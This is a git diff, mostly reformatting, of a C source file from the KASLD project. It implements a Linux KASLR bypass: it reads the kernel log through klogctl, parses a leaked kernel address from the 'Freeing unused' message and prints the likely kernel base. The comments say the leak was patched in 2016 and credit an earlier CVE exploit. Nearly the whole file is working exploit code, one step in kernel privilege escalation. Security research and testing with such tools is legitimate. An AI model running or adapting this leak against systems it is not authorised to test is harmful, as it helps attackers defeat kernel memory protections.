@@ -1,22 +1,29 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// free_reserved_area() dmesg KASLR bypass
-// Requires kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
-// - https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
+//
+// free_reserved_area() dmesg KASLR bypass for SMP kernels.
+//
+// Requires:
+// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems);
+//   or CAP_SYSLOG capabilities.
+//
+// https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
+//
 // free_reserved_area() leak was patched in 2016:
-// - https://lore.kernel.org/patchwork/patch/728905/
+// https://lore.kernel.org/patchwork/patch/728905/
+//
 // Mostly taken from original code by xairy:
-// - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
+// https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c
 
 #define _GNU_SOURCE
 
-#include <stdio.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <sys/klog.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
+#include <unistd.h>
 
 // https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
 unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
@@ -34,7 +41,7 @@ struct utsname get_kernel_version() {
 #define SYSLOG_ACTION_READ_ALL 3
 #define SYSLOG_ACTION_SIZE_BUFFER 10
 
-int mmap_syslog(char** buffer, int* size) {
+int mmap_syslog(char **buffer, int *size) {
   *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
   if (*size == -1) {
     printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
@@ -42,7 +49,8 @@ int mmap_syslog(char** buffer, int* size) {
   }
 
   *size = (*size / getpagesize() + 1) * getpagesize();
-  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
+                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
   *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
   if (*size == -1) {
@@ -54,29 +62,32 @@ int mmap_syslog(char** buffer, int* size) {
 }
 
 unsigned long get_kernel_addr_free_reserved_area_dmesg() {
-  char* syslog;
+  char *syslog;
   int size;
 
   if (mmap_syslog(&syslog, &size))
     return 0;
 
-  const char* needle1 = "Freeing unused";
-  char* substr = (char*)memmem(&syslog[0], size, needle1, strlen(needle1));
+  const char *needle1 = "Freeing unused";
+  char *substr = (char *)memmem(&syslog[0], size, needle1, strlen(needle1));
   if (substr == NULL)
     return 0;
 
   int start = 0;
   int end = 0;
-  for (start = 0; substr[start] != '-'; start++);
-  for (end = start; substr[end] != '\n'; end++);
+  for (start = 0; substr[start] != '-'; start++)
+    ;
+  for (end = start; substr[end] != '\n'; end++)
+    ;
 
-  const char* needle2 = "ffffff";
-  substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
+  const char *needle2 = "ffffff";
+  substr =
+      (char *)memmem(&substr[start], end - start, needle2, strlen(needle2));
 
   if (substr == NULL)
     return 0;
 
-  char* endptr = &substr[16];
+  char *endptr = &substr[16];
   unsigned long addr = strtoul(&substr[0], &endptr, 16);
 
   if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
@@ -85,7 +96,7 @@ unsigned long get_kernel_addr_free_reserved_area_dmesg() {
   return 0;
 }
 
-int main (int argc, char **argv) {
+int main(int argc, char **argv) {
   printf("[.] checking dmesg for free_reserved_area() info ...\n");
 
   struct utsname u = get_kernel_version();
@@ -96,7 +107,8 @@ int main (int argc, char **argv) {
   }
 
   unsigned long addr = get_kernel_addr_free_reserved_area_dmesg();
-  if (!addr) return 1;
+  if (!addr)
+    return 1;
 
   printf("leaked address: %lx\n", addr);
 
@@ -104,8 +116,8 @@ int main (int argc, char **argv) {
   printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
 
   /* ubuntu xenial */
-  printf("kernel base (likely): %lx\n", (addr & 0xfffffffffff00000ul) - 0x1000000ul);
+  printf("kernel base (likely): %lx\n",
+         (addr & 0xfffffffffff00000ul) - 0x1000000ul);
 
   return 0;
 }
-
